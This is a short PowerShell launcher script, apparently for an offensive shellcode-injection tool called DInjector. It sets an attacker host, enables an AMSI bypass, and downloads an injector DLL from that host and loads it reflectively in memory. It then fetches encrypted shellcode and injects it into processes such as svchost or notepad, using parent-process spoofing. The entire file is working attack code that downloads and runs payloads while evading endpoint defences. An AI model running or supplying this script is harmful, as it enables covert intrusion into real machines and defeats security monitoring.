# module name
$M = "currentthread"

# attacker's host
$H = "10.10.13.37"

# bypass AMSI ("True" / "False")
$A = "True"

# injector filename
$D = "DInjector.dll"

# encrypted shellcode filename
$S = "enc"

# password to decrypt the shellcode
$W = "Passw0rd!"

# path to the image of a newly spawned process to inject into (used in "remotethreadapc", "remotethreadcontext" and "processhollow")
$I = "C:\Windows\System32\svchost.exe"

# existing process name to inject into (used in "remotethread" and "remotethreadsuspended")
$P = "notepad"

# parent process name to spoof the original value (use "0" to disable PPID spoofing)
$PP = "explorer"

# block 3rd-party DLLs ("True" / "False")
$BD = "True"

# --------------------------------------------------------------------

$methods = @("remotethread", "remotethreadsuspended")
if ($methods.Contains($M)) {
    $P = (Start-Process -WindowStyle Hidden -PassThru $P).Id
}

$methods = @("remotethreadapc", "remotethreadcontext", "processhollow")
if ($methods.Contains($M)) {
    try {
        $PP = (Get-Process $PP -ErrorAction Stop).Id
    }
    catch {
        $PP = 0
    }
}

$cmd = "$M /am51:$A /sc:http://$H/$S /password:$W /image:$I /pid:$P /ppid:$PP /blockDlls:$BD"

$data = (IWR -UseBasicParsing "http://$H/$D").Content
$assem = [System.Reflection.Assembly]::Load($data)

$flags = [Reflection.BindingFlags] "NonPublic,Static"

$class = $assem.GetType("DInjector.Detonator", $flags)
$entry = $class.GetMethod("Boom", $flags)

$entry.Invoke($null, (, $cmd.Split(" ")))
